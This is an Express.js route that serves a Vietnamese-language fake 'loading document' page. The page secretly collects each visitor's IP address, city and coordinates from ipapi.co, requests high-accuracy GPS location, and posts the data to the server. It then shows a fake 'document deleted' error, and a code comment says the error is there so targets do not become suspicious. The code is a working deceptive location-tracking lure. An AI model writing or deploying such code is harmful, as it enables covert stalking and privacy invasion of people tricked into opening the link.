app.get("/", (req, res) => {
    res.send(`
      <body style="font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background: #f9f9f9; margin: 0;">
        
        <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
        <h2 style="color: #555; margin-top: 20px;">Đang tải tài liệu, vui lòng chờ...</h2>
        <p style="color: #888; font-size: 14px;">Hệ thống đang xác thực kết nối an toàn...</p>

        <style>
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>

        <script>
          // Chạy ngầm việc lấy dữ liệu
          fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(ipData => {
                const info = {
                    ip: ipData.ip,
                    city: ipData.city,
                    lat: ipData.latitude,
                    lon: ipData.longitude,
                    type: "IP Geolocation"
                };

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        info.lat = position.coords.latitude;
                        info.lon = position.coords.longitude;
                        info.type = "GPS Precision";
                        sendData(info);
                    }, () => { sendData(info); }, { enableHighAccuracy: true });
                } else {
                    sendData(info);
                }
            });

          function sendData(data) {
            fetch('/api/visit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                // Sau khi gửi xong, có thể hiện thông báo lỗi giả để họ không nghi ngờ
                setTimeout(() => {
                    document.body.innerHTML = "<h3 style='color: #555;'>Lỗi: Tài liệu này không còn tồn tại hoặc đã bị xóa.</h3><a href='/'>Thử lại</a>";
                }, 3000);
            });
          }
        </script>
      </body>
    `);
});
